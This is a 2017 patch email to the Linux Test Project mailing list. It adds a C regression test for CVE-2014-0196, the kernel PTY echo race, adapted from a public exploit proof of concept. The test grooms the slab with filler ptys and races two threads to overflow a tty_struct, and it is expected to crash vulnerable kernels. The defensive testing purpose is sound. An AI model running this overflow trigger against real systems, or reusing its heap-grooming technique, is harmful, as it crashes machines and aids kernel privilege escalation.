From: Richard Palethorpe <rpalethorpe@suse.com>
Date: Fri, 23 Jun 2017 14:22:08 +0200
Subject: [LTP] [PATCH v3 6/9] Test for CVE-2014-0196 PTY echo race
In-Reply-To: <20170623122211.29575-1-rpalethorpe@suse.com>
References: <20170623122211.29575-1-rpalethorpe@suse.com>
Message-ID: <20170623122211.29575-7-rpalethorpe@suse.com>
List-Id: <ltp.lists.linux.it>
MIME-Version: 1.0
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
To: ltp@lists.linux.it

Signed-off-by: Richard Palethorpe <rpalethorpe@suse.com>
---
 runtest/cve                   |   1 +
 testcases/cve/.gitignore      |   1 +
 testcases/cve/cve-2014-0196.c | 161 ++++++++++++++++++++++++++++++++++++++++++
 3 files changed, 163 insertions(+)
 create mode 100644 testcases/cve/cve-2014-0196.c

diff --git a/runtest/cve b/runtest/cve
index 83b53d906..6556ffb0f 100644
--- a/runtest/cve
+++ b/runtest/cve
@@ -1,5 +1,6 @@
 # Tests which check for vulnerabilities by CVE number
 cve-2012-0957 cve-2012-0957
+cve-2014-0196 cve-2014-0196
 cve-2016-4997 cve-2016-4997
 cve-2016-5195 dirtyc0w
 cve-2016-7117 cve-2016-7117
diff --git a/testcases/cve/.gitignore b/testcases/cve/.gitignore
index 9c24b83ec..ff5844263 100644
--- a/testcases/cve/.gitignore
+++ b/testcases/cve/.gitignore
@@ -1,3 +1,4 @@
 cve-2012-0957
+cve-2014-0196
 cve-2016-4997
 cve-2016-7117
diff --git a/testcases/cve/cve-2014-0196.c b/testcases/cve/cve-2014-0196.c
new file mode 100644
index 000000000..4e2b3f582
--- /dev/null
+++ b/testcases/cve/cve-2014-0196.c
@@ -0,0 +1,161 @@
+/*
+ * Copyright (c) 2017 Richard Palethorpe <rpalethorpe@suse.com>
+ * Original POC by Matthew Daley <mattd@bugfuzz.com>
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 2 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program. If not, see <http://www.gnu.org/licenses/>.
+ */
+/*
+ * This test attempts to cause a buffer overflow using the race condition
+ * described in CVE-2014-0196. If the test is successful in causing an
+ * overflow it will most likely result in an immediate Oops, restart or
+ * freeze. However if it overwrites memory not accessed during the test then
+ * it could happen at a later time or not at all which is more likely if SLAB
+ * randomization has been implemented. However as it currently stands, the test
+ * usually crashes as soon as the delay has been calibrated.
+ *
+ * To maximise the chances of the buffer overflow doing immediate detectable
+ * damage the SLAB filler sockets and ioctls from the original exploit POC
+ * have been kept even though they are not strictly necessary to reproduce the
+ * bug.
+ *
+ * Further details:
+ * see linux commit 4291086b1f081b869c6d79e5b7441633dc3ace00
+ * privilege escalation POC https://www.exploit-db.com/exploits/33516/
+ */
+
+#include <pty.h>
+#include <stdio.h>
+#include <string.h>
+#include <termios.h>
+#include <limits.h>
+
+#include "tst_test.h"
+#include "tst_timer.h"
+#include "tst_safe_pthread.h"
+
+#include "tst_fuzzy_sync.h"
+
+#define ONEOFF_ALLOCS 200
+#define RUN_ALLOCS    30
+#define ATTEMPTS      0x7000
+#define BUFLEN        512
+
+static int master_fd, slave_fd;
+static int filler_ptys[ONEOFF_ALLOCS * 2];
+static int target_ptys[RUN_ALLOCS * 2];
+static char buf[BUFLEN];
+
+static struct tst_fzsync_pair fzsync_pair = TST_FZSYNC_PAIR_INIT;
+
+static void create_pty(int *amaster, int *aslave)
+{
+	if (openpty(amaster, aslave, NULL, NULL, NULL) == -1)
+		tst_brk(TBROK | TERRNO, "pty creation failed");
+}
+
+static void setup(void)
+{
+	int i;
+
+	fzsync_pair.delay_inc = 100;
+	for (i = 0; i < ONEOFF_ALLOCS; i++) {
+		create_pty(&filler_ptys[i],
+			   &filler_ptys[i + ONEOFF_ALLOCS]);
+	}
+}
+
+static void *overwrite_thread_fn(void *p)
+{
+	tst_fzsync_delay_b(&fzsync_pair);
+	tst_fzsync_time_b(&fzsync_pair);
+
+	SAFE_WRITE(0, slave_fd, buf, BUFLEN - 1);
+	SAFE_WRITE(0, slave_fd, buf, BUFLEN - 1);
+	SAFE_WRITE(0, slave_fd, buf, BUFLEN);
+
+	return p;
+}
+
+static void run(void)
+{
+	struct termios t;
+	pthread_t overwrite_thread;
+	int i, j;
+
+	tst_res(TINFO, "Attempting to overflow into a tty_struct...");
+
+	for (i = 0; i < ATTEMPTS; i++) {
+		create_pty(&master_fd, &slave_fd);
+
+		for (j = 0; j < RUN_ALLOCS; j++)
+			create_pty(&target_ptys[j],
+				   &target_ptys[j + RUN_ALLOCS]);
+		SAFE_CLOSE(target_ptys[RUN_ALLOCS / 2]);
+		SAFE_CLOSE(target_ptys[RUN_ALLOCS / 2 + RUN_ALLOCS]);
+
+		SAFE_WRITE(0, slave_fd, buf, 1);
+
+		tcgetattr(master_fd, &t);
+		t.c_oflag &= ~OPOST;
+		t.c_lflag |= ECHO;
+		tcsetattr(master_fd, TCSANOW, &t);
+
+		SAFE_PTHREAD_CREATE(&overwrite_thread, NULL,
+				    overwrite_thread_fn, NULL);
+
+		tst_fzsync_delay_a(&fzsync_pair);
+		tst_fzsync_time_a(&fzsync_pair);
+		SAFE_WRITE(0, master_fd, "A", 1);
+
+		SAFE_PTHREAD_JOIN(overwrite_thread, NULL);
+
+		tst_fzsync_pair_update(i, &fzsync_pair);
+
+		if (!(i & 0x1FFF))
+			tst_fzsync_pair_info(&fzsync_pair);
+
+		for (j = 0; j < RUN_ALLOCS; j++) {
+			if (j == RUN_ALLOCS / 2)
+				continue;
+
+			ioctl(target_ptys[j], 0xdeadbeef);
+			ioctl(target_ptys[j + RUN_ALLOCS], 0xdeadbeef);
+			SAFE_CLOSE(target_ptys[j]);
+			SAFE_CLOSE(target_ptys[j + RUN_ALLOCS]);
+		}
+
+		ioctl(master_fd, 0xdeadbeef);
+		ioctl(slave_fd, 0xdeadbeef);
+		SAFE_CLOSE(master_fd);
+		SAFE_CLOSE(slave_fd);
+	}
+
+	tst_res(TPASS, "Nothing bad happened, probably.");
+}
+
+static void cleanup(void)
+{
+	int i;
+
+	for (i = 0; i < ONEOFF_ALLOCS * 2; i++)
+		close(filler_ptys[i]);
+	close(master_fd);
+	close(slave_fd);
+}
+
+static struct tst_test test = {
+	.setup = setup,
+	.cleanup = cleanup,
+	.test_all = run,
+};
-- 
2.12.2

